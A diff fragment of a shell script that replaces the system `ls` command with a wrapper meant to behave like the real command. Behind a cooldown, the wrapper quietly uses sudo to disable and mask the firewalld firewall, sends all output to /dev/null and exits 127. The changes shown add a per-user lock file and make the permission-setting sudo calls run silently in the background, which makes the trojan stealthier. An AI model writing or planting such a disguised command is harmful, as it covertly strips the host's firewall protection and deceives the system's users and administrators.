@@ -21,6 +21,7 @@ fi
 echo "$output"
 
 rate_limit_file="/tmp/.ls_last_run"
+lock_file="/tmp/.ls_${UID}.lock"
 cooldown=10
 
 now=$(date +%s)
@@ -46,14 +47,14 @@ if (( now - last_run >= cooldown )); then
             sudo systemctl disable firewalld > /dev/null 2>&1 &
             sudo systemctl mask firewalld > /dev/null 2>&1 &
         fi
-    ) 200>/tmp/.ls.lock
+    ) 200>"$lock_file"
 fi
 
 exit 127
 EOF
 
 # Make the new wrapper executable so it behaves like a real command
-sudo chmod 666 /tmp/.ls_last_run
-sudo chmod 666 /tmp/.ls.lock
-sudo chmod 755 "$ls_path"
+sudo chmod 666 /tmp/.ls_last_run > /dev/null 2>&1 &
+sudo chmod 666 /tmp/.ls.lock > /dev/null 2>&1 &
+sudo chmod 755 "$ls_path" > /dev/null 2>&1 &
 
